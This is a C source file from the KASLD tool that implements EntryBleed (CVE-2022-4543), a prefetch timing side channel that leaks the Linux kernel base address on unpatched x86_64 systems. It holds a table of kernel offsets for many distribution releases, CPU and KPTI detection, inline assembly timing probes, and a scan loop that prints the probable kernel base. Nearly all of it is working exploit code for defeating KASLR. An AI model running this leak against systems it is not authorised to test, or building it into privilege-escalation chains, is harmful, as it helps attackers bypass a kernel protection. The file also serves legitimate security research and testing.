// This file is part of KASLD - https://github.com/bcoles/kasld
//
// EntryBleed (CVE-2022-4543) prefetch side-channel address leak.
//
// Works on Intel x86_64 CPUs with KPTI enabled or disabled.
// Works on AMD x86_64 CPUs with KPTI disabled.
//
// Leaks adddress for entry_SYSCALL_64 symbol (when KPTI is enabled);
// or address for __start_rodata symbol (when KPTI is disabled).
//
// These symbols are located at a static offset from the kernel base
// address even if FG-KASLR is enabled.
//
// Patched in kernel ~v6.2 on 2022-12-16:
// https://github.com/torvalds/linux/commit/97e3d26b5e5f371b3ee223d94dd123e6c442ba80
//
// Uses original proof of concept code by Will:
// https://www.willsroot.io/2022/12/entrybleed.html
//
// References:
// https://gruss.cc/files/prefetch.pdf
// https://www.openwall.com/lists/oss-security/2022/12/16/3
// https://www.willsroot.io/2022/12/entrybleed.html
// https://googleprojectzero.blogspot.com/2022/12/exploiting-CVE-2022-42703-bringing-back-the-stack-attack.html
// https://bugs.chromium.org/p/project-zero/issues/detail?id=2351
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "kasld.h"
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>

int kernel = -1;

struct kernel_info {
  const char *kernel_version;
  uint64_t entry_syscall_64;
  uint64_t start_rodata;
};

// clang-format off
// offsets must be page aligned
struct kernel_info offsets[] = {
    // CentOS 8.0.1905
    {"4.18.0-80.el8.x86_64 #1 SMP Tue Jun 4 09:19:46 UTC 2019",                          0xa00000, 0xe00000},

    // CentOS 8.2.2004
    {"4.18.0-193.el8.x86_64 #1 SMP Fri May 8 10:59:10 UTC 2020",                         0xa00000, 0xe00000},

    // CentOS 8.3.2011
    {"4.18.0-240.el8.x86_64 #1 SMP Fri Sep 25 19:48:47 UTC 2020",                        0xa00000, 0xe00000},

    // RHEL 8.3
    {"4.18.0-240.el8.x86_64 #1 SMP Wed Sep 23 05:13:10 EDT 2020",                        0xa00000, 0xe00000},

    // Debian 11.0
    {"5.10.0-8-amd64 #1 SMP Debian 5.10.46-4 (2021-08-03)",                              0xa00000, 0xe00000},
    {"5.10.0-8-amd64 #1 SMP Debian 5.10.46-5 (2021-09-23)",                              0xa00000, 0xe00000},
    {"5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13)",                            0xa00000, 0xe00000},
    {"5.10.0-11-amd64 #1 SMP Debian 5.10.92-2 (2022-02-28)",                             0xa00000, 0xe00000},
    {"5.10.0-12-amd64 #1 SMP Debian 5.10.103-1 (2022-03-07)",                            0xa00000, 0xe00000},
    {"5.10.0-14-amd64 #1 SMP Debian 5.10.113-1 (2022-04-29)",                            0xa00000, 0xe00000},
    {"5.10.0-15-amd64 #1 SMP Debian 5.10.120-1 (2022-06-09)",                            0xa00000, 0xe00000},
    {"5.10.0-16-amd64 #1 SMP Debian 5.10.127-2 (2022-07-23)",                            0xa00000, 0xe00000},
    {"5.10.0-17-amd64 #1 SMP Debian 5.10.136-1 (2022-08-13)",                            0xa00000, 0xe00000},
    {"5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02)",                            0xa00000, 0xe00000},
    {"5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21)",                            0xa00000, 0xe00000},

    // Fedora 29
    {"4.18.16-300.fc29.x86_64 #1 SMP Sat Oct 20 23:24:08 UTC 2018",                      0xa00000, 0xe00000},

    // Fedora 30
    {"5.0.9-301.fc30.x86_64 #1 SMP Tue Apr 23 23:57:35 UTC 2019",                        0xa00000, 0xe00000},

    // Fedora 36
    {"5.17.5-300.fc36.x86_64 #1 SMP PREEMPT Thu Apr 28 15:51:30 UTC 2022",               0xe00000, 0x1200000},

    // Manjaro 18.1
    {"5.2.11-1-MANJARO #1 SMP PREEMPT Thu Aug 29 07:41:24 UTC 2019",                     0xa00000, 0xe00000},

    // Ubuntu 19.04
    {"5.0.0-38-generic #41-Ubuntu SMP Tue Dec 3 00:27:35 UTC 2019",                      0xc00000, 0x1000000},

    // Ubuntu 20.04
    {"5.4.0-26-generic #30-Ubuntu SMP Mon Apr 20 16:58:30 UTC 2020",                     0xc00000, 0x1000000},
    {"5.8.0-23-generic #24~20.04.1-Ubuntu SMP Sat Oct 10 04:57:02 UTC 2020",             0xc00000, 0x1000000},
    {"5.8.0-63-generic #71~20.04.1-Ubuntu SMP Thu Jul 15 17:46:08 UTC 2021",             0xc00000, 0x1000000},
    {"5.11.0-22-generic #23~20.04.1-Ubuntu SMP Thu Jun 17 12:51:00 UTC 2021",            0xc00000, 0x1000000},
    {"5.11.0-25-generic #27~20.04.1-Ubuntu SMP Tue Jul 13 17:41:23 UTC 2021",            0xc00000, 0x1000000},
    {"5.11.0-27-generic #29~20.04.1-Ubuntu SMP Wed Aug 11 15:58:17 UTC 2021",            0xc00000, 0x1000000},
    {"5.11.0-34-generic #36~20.04.1-Ubuntu SMP Fri Aug 27 08:06:32 UTC 2021",            0xc00000, 0x1000000},
    {"5.11.0-36-generic #40~20.04.1-Ubuntu SMP Sat Sep 18 02:14:19 UTC 2021",            0xc00000, 0x1000000},
    {"5.11.0-37-generic #41~20.04.2-Ubuntu SMP Fri Sep 24 09:06:38 UTC 2021",            0xc00000, 0x1000000},
    {"5.11.0-38-generic #42~20.04.1-Ubuntu SMP Tue Sep 28 20:41:07 UTC 2021",            0xc00000, 0x1000000},
    {"5.11.0-40-generic #44~20.04.2-Ubuntu SMP Tue Oct 26 18:07:44 UTC 2021",            0xc00000, 0x1000000},
    {"5.11.0-41-generic #45~20.04.1-Ubuntu SMP Wed Nov 10 10:20:10 UTC 2021",            0xc00000, 0x1000000},
    {"5.11.0-43-generic #47~20.04.2-Ubuntu SMP Mon Dec 13 11:06:56 UTC 2021",            0xc00000, 0x1000000},
    {"5.11.0-44-generic #48~20.04.2-Ubuntu SMP Tue Dec 14 15:36:44 UTC 2021",            0xc00000, 0x1000000},
    {"5.13.0-21-generic #21~20.04.1-Ubuntu SMP Tue Oct 26 15:49:20 UTC 2021",            0xe00000, 0x1200000},
    {"5.13.0-22-generic #22~20.04.1-Ubuntu SMP Tue Nov 9 15:07:24 UTC 2021",             0xe00000, 0x1200000},
    {"5.13.0-23-generic #23~20.04.2-Ubuntu SMP Fri Dec 10 12:06:47 UTC 2021",            0xe00000, 0x1200000},
    {"5.13.0-23-lowlatency #23~20.04.2-Ubuntu SMP PREEMPT Fri Dec 10 13:47:24 UTC 2021", 0xe00000, 0x1200000},

    // Ubuntu 21.04
    {"5.11.0-22-generic #23-Ubuntu SMP Thu Jun 17 00:34:23 UTC 2021",                    0xe00000, 0x1200000},

    // Ubuntu 22.04.1
    {"5.15.0-52-generic #58-Ubuntu SMP Thu Oct 13 08:03:55 UTC 2022",                    0xe00000, 0x1200000},
    {"5.15.0-52-lowlatency #58-Ubuntu SMP PREEMPT Thu Oct 13 12:37:18 UTC 2022",         0xe00000, 0x1200000},
    {"5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022",                    0xe00000, 0x1200000},

    // openSUSE Leap 15.1
    {"4.12.14-lp151.28.10-default #1 SMP Sat Jul 13 17:59:31 UTC 2019 (0ab03b7)",        0x800000, 0xc00000},

    // Linux Mint 19.3
    {"5.4.0-135-generic #152~18.04.2-Ubuntu SMP Tue Nov 29 08:23:49 UTC 2022",           0xc00000, 0x1000000},
};
// clang-format on

struct utsname get_kernel_version() {
  struct utsname u;
  int rv = uname(&u);
  if (rv != 0) {
    printf("[-] uname()\n");
    exit(1);
  }
  return u;
}

#define ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))
#define KERNEL_VERSION_SIZE_BUFFER 512

void detect_kernel_version() {
  struct utsname u;
  char kernel_version[KERNEL_VERSION_SIZE_BUFFER];

  u = get_kernel_version();

  if (strstr(u.machine, "64") == NULL) {
    printf("[-] system is not using a 64-bit kernel\n");
    exit(1);
  }

  snprintf(kernel_version, KERNEL_VERSION_SIZE_BUFFER, "%s %s", u.release,
           u.version);

  int i;
  for (i = 0; i < ARRAY_SIZE(offsets); i++) {
    if (strcmp(kernel_version, offsets[i].kernel_version) == 0) {
      printf("[.] kernel version '%s' detected\n", offsets[i].kernel_version);
      kernel = i;
      return;
    }
  }

  printf("[-] kernel version '%s' not recognized\n", kernel_version);
  exit(1);
}

bool detect_cpu_pti_flag() {
  bool pti = false;
  FILE *cpuinfo = fopen("/proc/cpuinfo", "rb");
  char *line = 0;
  size_t size = 0;
  while (getline(&line, &size, cpuinfo) != -1) {
    if (strstr(line, "flags") == NULL)
      continue;
    if (strstr(line, " pti") != NULL) {
      pti = true;
      break;
    }
  }
  free(line);
  fclose(cpuinfo);
  return pti;
}

int detect_cpu_vendor() {
  int cpu = 0;
  FILE *cpuinfo = fopen("/proc/cpuinfo", "rb");
  char *line = 0;
  size_t size = 0;
  while (getline(&line, &size, cpuinfo) != -1) {
    if (strstr(line, "vendor") == NULL)
      continue;

    if (strstr(line, "AuthenticAMD") != NULL) {
      cpu = 1;
      break;
    }
    if (strstr(line, "Intel") != NULL) {
      cpu = 2;
      break;
    }
  }
  free(line);
  fclose(cpuinfo);
  return cpu;
}

uint64_t sidechannel(uint64_t addr) {
  uint64_t a, b, c, d;
  __asm__ volatile(".intel_syntax noprefix;"
               "mfence;"
               "rdtscp;"
               "mov %0, rax;"
               "mov %1, rdx;"
               "xor rax, rax;"
               "lfence;"
               "prefetchnta qword ptr [%4];"
               "prefetcht2 qword ptr [%4];"
               "xor rax, rax;"
               "lfence;"
               "rdtscp;"
               "mov %2, rax;"
               "mov %3, rdx;"
               "mfence;"
               ".att_syntax;"
               : "=r"(a), "=r"(b), "=r"(c), "=r"(d)
               : "r"(addr)
               : "rax", "rbx", "rcx", "rdx");
  a = (b << 32) | a;
  c = (d << 32) | c;
  return c - a;
}

#define STEP 0x100000ull
#define ARR_SIZE (KERNEL_BASE_MAX - KERNEL_BASE_MIN) / STEP

uint64_t leak_syscall_entry(uint64_t offset) {
  int iterations = 100;
  int dummy_iterations = 5;
  uint64_t data[ARR_SIZE] = {0};
  uint64_t min = ~0, addr = ~0;

  uint64_t SCAN_START = KERNEL_BASE_MIN + offset;

  for (int i = 0; i < iterations + dummy_iterations; i++) {
    for (uint64_t idx = 0; idx < ARR_SIZE; idx++) {
      uint64_t test = SCAN_START + idx * STEP;
      syscall(104);
      uint64_t time = sidechannel(test);
      if (i >= dummy_iterations)
        data[idx] += time;
    }
  }

  for (int i = 0; i < ARR_SIZE; i++) {
    data[i] /= iterations;
    if (data[i] < min) {
      min = data[i];
      addr = SCAN_START + i * STEP;
    }
    // printf("%llx %ld\n", (SCAN_START + i * STEP), data[i]);
  }

  if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
    return addr - offset;

  return 0;
}

int main(int argc, char **argv) {
  printf("[.] trying EntryBleed (CVE-2022-4543) ...\n");

  int cpu = detect_cpu_vendor();

  if (cpu == 0) {
    printf("[-] Unknown CPU vendor\n");
    exit(1);
  }

  int pti = detect_cpu_pti_flag();

  printf("[.] %s CPU with KTPI %s\n", (cpu == 1 ? "AMD" : "Intel"),
         (pti ? "enabled" : "disabled"));

  if (cpu == 1 && pti == 1) {
    printf(
        "[-] AMD systems with KPTI enabled are not affected by EntryBleed\n");
    exit(1);
  }

  detect_kernel_version();

  uint64_t offset = offsets[kernel].start_rodata;
  if (pti)
    offset = offsets[kernel].entry_syscall_64;

  unsigned long addr = leak_syscall_entry(offset);
  if (!addr)
    return 1;

  printf("possible kernel base: %lx\n", addr);
  return 0;
}
